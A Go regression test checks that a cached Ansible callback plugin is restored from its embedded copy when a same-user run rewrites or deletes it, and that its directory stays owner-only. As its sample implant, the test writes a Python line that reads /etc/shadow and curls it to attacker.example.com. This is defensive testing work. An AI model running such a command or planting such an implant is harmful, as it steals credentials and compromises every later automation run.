package roundhouse

import (
	"os"
	"path/filepath"
	"testing"
)

// TestCallbackPluginIsRestoredBeforeEveryUse covers the one place a run can leave something behind
// that every later run then executes. The callback plugin is materialized once to a temp directory and
// its path is handed to Ansible as ANSIBLE_CALLBACK_PLUGINS, so Ansible imports that file on every
// Ansible run. A host run executes as the server's own user, which is the same user that owns the
// directory, so a playbook, a bash script, or a python step could rewrite the file. From then on every
// Ansible run on the host imported the attacker's code, silently and permanently, and the file mode
// could not prevent it because the mode was never the obstacle: the uid was the same.
//
// The plugin is now checked against the embedded copy before each use and restored when it differs, so
// what was a persistent implant across every future run becomes, at worst, a race inside one.
func TestCallbackPluginIsRestoredBeforeEveryUse(t *testing.T) {
	t.Parallel()
	cache := &pluginCache{}
	dir, err := cache.ensure()
	if err != nil {
		t.Fatalf("ensure() error = %v", err)
	}
	t.Cleanup(func() { _ = os.RemoveAll(dir) })
	path := filepath.Join(dir, pluginName+".py")

	// A run on this host, executing as the same user, rewrites the plugin.
	implant := []byte("import os\nos.system('curl attacker.example.com/$(cat /etc/shadow)')\n")
	if err := os.WriteFile(path, implant, 0o600); err != nil {
		t.Fatalf("write implant: %v", err)
	}

	// The next run asks for the plugin directory, which is what happens before every Ansible run.
	again, err := cache.ensure()
	if err != nil {
		t.Fatalf("second ensure() error = %v", err)
	}
	if again != dir {
		t.Errorf("plugin dir moved from %q to %q", dir, again)
	}
	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read plugin: %v", err)
	}
	if string(got) != callbackPlugin {
		t.Error("the modified callback plugin was left in place, so every later Ansible run on this " +
			"host imports whatever the last run wrote there")
	}

	// A plugin file that was deleted outright is restored too, since a missing callback is a run with
	// no events rather than a run that fails, which is the quieter and worse outcome.
	if err := os.Remove(path); err != nil {
		t.Fatalf("remove plugin: %v", err)
	}
	if _, err := cache.ensure(); err != nil {
		t.Fatalf("third ensure() error = %v", err)
	}
	if got, err := os.ReadFile(path); err != nil || string(got) != callbackPlugin {
		t.Errorf("deleted plugin was not restored: %v", err)
	}

	// The directory itself is not world-readable, which is the part a different user is stopped by.
	info, err := os.Stat(dir)
	if err != nil {
		t.Fatalf("stat plugin dir: %v", err)
	}
	if perm := info.Mode().Perm(); perm&0o077 != 0 {
		t.Errorf("plugin dir mode = %o, want no access outside its owner", perm)
	}
}
